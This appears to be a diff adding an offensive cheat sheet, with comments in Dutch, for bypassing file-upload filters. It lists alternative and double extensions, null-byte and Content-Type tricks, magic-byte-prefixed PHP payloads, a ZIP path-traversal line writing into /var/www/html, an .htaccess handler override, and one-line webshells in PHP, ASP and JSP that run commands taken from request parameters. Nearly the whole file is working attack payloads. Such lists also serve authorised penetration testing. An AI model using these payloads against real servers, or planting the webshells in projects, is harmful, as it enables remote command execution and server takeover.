@@ -1,0 +1,44 @@
+# File Upload - Extension en Path Bypass
+# === Extension bypass ===
+# PHP alternatieven:
+shell.php3
+shell.php4
+shell.php5
+shell.phtml
+shell.phar
+shell.phps
+shell.pHp (case sensitivity)
+# ASP alternatieven:
+shell.asp
+shell.aspx
+shell.ashx
+shell.asmx
+# JSP alternatieven:
+shell.jsp
+shell.jspx
+shell.jsw
+shell.jsv
+# === Double extension ===
+shell.php.jpg
+shell.php.png
+shell.jpg.php
+# === Null byte (oude versies) ===
+shell.php%00.jpg
+shell.php\x00.jpg
+# === Content-Type bypass ===
+# Wijzig Content-Type header naar: image/jpeg, image/png, image/gif
+# === Magic bytes ===
+# GIF header toevoegen: GIF89a<?php system($_GET['cmd']); ?>
+# PNG header: \x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+# === ZIP traversal (path traversal in archive) ===
+# Python: z.writestr('../../../../../var/www/html/shell.phtml', payload)
+# Werkt als server ZIP extraheert zonder pad-sanitization
+# === .htaccess upload ===
+# Upload .htaccess met: AddType application/x-httpd-php .jpg
+# Dan upload shell.jpg met PHP code
+# === Webshells ===
+# PHP: <?php system($_GET['cmd']); ?>
+# PHP kort: <?=`$_GET[0]`?>
+# ASP: <% eval request("cmd") %>
+# JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+# Tip: Probeer alle extensie-varianten systematisch met Burp Intruder
